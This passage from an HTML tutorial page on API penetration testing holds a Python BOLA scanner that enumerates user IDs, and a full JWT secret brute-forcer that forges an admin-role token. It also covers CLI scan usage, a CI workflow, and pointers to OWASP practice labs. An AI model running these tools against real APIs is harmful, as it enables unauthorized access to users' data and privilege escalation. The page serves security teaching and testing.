                lambda uid: self.test_endpoint(endpoint_template, uid),
                range(self.start_id, self.end_id + 1)
            )

            for result in results:
                if result:
                    found_count += 1
                    print(f"[+] Found: User {result['id']} - {result['url']}")
                    self.vulnerable_endpoints.append(result)

        print(f"\n[*] Total accessible: {found_count}/{self.end_id - self.start_id + 1}")
        return self.vulnerable_endpoints

    def save_results(self, filename="bola_results.json"):
        """Save results to file"""
        with open(filename, 'w') as f:
            json.dump(self.vulnerable_endpoints, f, indent=2)
        print(f"[*] Results saved to {filename}")

if __name__ == "__main__":
    # Configuration
    BASE_URL = "https://api.example.com"
    TOKEN = "your_jwt_token_here"

    # Initialize scanner
    scanner = BOLAScanner(BASE_URL, TOKEN, start_id=1, end_id=100)

    # Test different endpoints
    endpoints = [
        f"{BASE_URL}/api/v1/users/{{id}}/profile",
        f"{BASE_URL}/api/v1/users/{{id}}/orders",
        f"{BASE_URL}/api/v1/accounts/{{id}}",
    ]

    for endpoint in endpoints:
        scanner.scan(endpoint)

    # Save results
    scanner.save_results()</code></pre>
                    </div>
                </div>

                <div class="concept-card">
                    <h4>2. JWT Brute Force Tool</h4>
                    <div class="code-block">
                        <pre><code>#!/usr/bin/env python3
"""
JWT Secret Brute Forcer
"""

import jwt
import sys
from time import time

def brute_force_jwt(token, wordlist_file):
    """Brute force JWT secret"""

    try:
        # Decode without verification to get algorithm
        header = jwt.get_unverified_header(token)
        algorithm = header.get('alg', 'HS256')

        print(f"[*] Token algorithm: {algorithm}")
        print(f"[*] Starting brute force attack...")

        start_time = time()
        attempts = 0

        with open(wordlist_file, 'r') as f:
            for line in f:
                secret = line.strip()
                attempts += 1

                try:
                    # Try to verify with this secret
                    jwt.decode(
                        token,
                        secret,
                        algorithms=[algorithm]
                    )

                    # If we get here, secret is correct!
                    elapsed = time() - start_time
                    print(f"\n[+] SECRET FOUND: {secret}")
                    print(f"[+] Attempts: {attempts}")
                    print(f"[+] Time: {elapsed:.2f} seconds")
                    return secret

                except jwt.InvalidSignatureError:
                    # Wrong secret, continue
                    if attempts % 1000 == 0:
                        print(f"[*] Tried {attempts} secrets...", end='\r')
                    continue
                except Exception as e:
                    # Other error
                    continue

        print(f"\n[-] Secret not found in wordlist ({attempts} attempts)")
        return None

    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def create_forged_token(original_token, secret, new_payload):
    """Create forged JWT with new payload"""

    header = jwt.get_unverified_header(original_token)
    algorithm = header.get('alg', 'HS256')

    forged = jwt.encode(
        new_payload,
        secret,
        algorithm=algorithm,
        headers=header
    )

    return forged

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <jwt_token> <wordlist>")
        sys.exit(1)

    token = sys.argv[1]
    wordlist = sys.argv[2]

    # Brute force
    secret = brute_force_jwt(token, wordlist)

    if secret:
        # Create forged token with admin role
        payload = jwt.decode(token, secret, algorithms=["HS256"])
        payload['role'] = 'admin'

        forged_token = create_forged_token(token, secret, payload)
        print(f"\n[+] Forged admin token:")
        print(forged_token)</code></pre>
                    </div>
                </div>
            </section>

            <!-- Automation -->
            <section id="automation" class="doc-section">
                <h2><i class="fas fa-robot"></i> Automation & Integration</h2>

                <div class="concept-card">
                    <h3>Using with Penetration Test Suite</h3>
                    <p>Integrate API testing into your workflow:</p>

                    <div class="code-block">
                        <pre><code># Run API-specific scans
python3 penetration-test.py scan api.example.com \
  --categories api_testing \
  --plugins api_scanner,jwt_analyzer,graphql_enum

# With custom configuration
python3 penetration-test.py scan api.example.com \
  --plugin api_scanner \
  --config api_config.json \
  --threads 5 \
  --output api_results/

# Generate API-focused report
python3 penetration-test.py report \
  --scan api_scan_id \
  --type api_security \
  --format html,json</code></pre>
                    </div>
                </div>

                <div class="concept-card">
                    <h3>CI/CD Integration</h3>
                    <div class="code-block">
                        <pre><code># .github/workflows/api-security.yml
name: API Security Testing

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  api-security:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v2

      - name: Setup Python
        uses: actions/setup-python@v2
        with:
          python-version: '3.9'

      - name: Install Dependencies
        run: |
          pip install -r requirements.txt

      - name: Run API Security Tests
        run: |
          python3 penetration-test.py scan ${{ secrets.API_URL }} \
            --categories api_testing \
            --severity critical,high \
            --fail-on-critical \
            --output results/

      - name: Upload Results
        if: always()
        uses: actions/upload-artifact@v2
        with:
          name: api-security-results
          path: results/</code></pre>
                    </div>
                </div>
            </section>

            <div class="alert alert-info" style="margin-top: 3rem;">
                <strong>üéì Ready to Practice?</strong> Set up a local vulnerable API lab using
                <a href="https://github.com/OWASP/crAPI" target="_blank">OWASP crAPI</a> or
                <a href="https://github.com/DevSlop/Pixi" target="_blank">Pixi</a> to practice these techniques safely!
            </div>
        </main>
    </div>

    <script src="js/main.js"></script>
    <script>
        function showTab(tabId) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });

            // Deactivate all buttons
            document.querySelectorAll('.tab-button').forEach(btn => {
                btn.classList.remove('active');
            });

            // Show selected tab
            document.getElementById(tabId).classList.add('active');

            // Activate clicked button
            event.target.classList.add('active');
        }
    </script>
</body>
</html>
